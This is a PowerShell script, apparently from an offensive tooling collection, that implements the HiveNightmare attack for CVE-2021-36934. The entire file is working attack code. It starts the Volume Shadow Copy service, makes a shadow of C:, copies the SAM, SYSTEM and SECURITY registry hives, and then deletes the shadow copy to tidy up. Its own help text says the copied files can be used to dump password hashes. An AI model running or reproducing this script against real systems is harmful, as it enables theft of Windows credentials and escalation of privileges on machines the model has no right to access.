function HiveNightmare
{
<#
.SYNOPSIS
CVE-2021-36934 Vulnerability

.DESCRIPTION
This payload uses the VSS service (starts it if not running), creates a shadow of C: 
and copies the HIVE files which could be used to dump password hashes from it. 
The default path used for HIVE is C:\Windows\System32\config\

.PARAMETER PATH
The path where the files would be saved. It must already exist.

.EXAMPLE
PS > HiveNightmare
Saves the files in current run location of the payload.

.Example
PS > HiveNightmare -Dest C:\temp
Saves the files in C:\temp.

.LINK
https://github.com/GossiTheDog/HiveNightmare
https://github.com/wolf0x/HiveNightmare


.NOTES
Code by wolf0x

#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Dest
    )
    $service = (Get-Service -name VSS)
    if($service.Status -ne "Running")
    {
        $notrunning=1
        $service.Start()
    }
    $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")
    $SAMpath = "$pwd\SAM"
    $SYSTEMpath = "$pwd\SYSTEM"
    $SECURITYpath = "$pwd\SECURITY"
    if ($Dest)
    {
        $SAMpath = "$Dest\SAM"
        $SYSTEMpath = "$Dest\SYSTEM"
        $SECURITYpath = "$Dest\SECURITY"
    }


    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $SAMpath
    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SYSTEM" $SYSTEMpath
    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SECURITY" $SECURITYpath

    $volume.Delete()
    if($notrunning -eq 1)
    {
        $service.Stop()
    } 
}


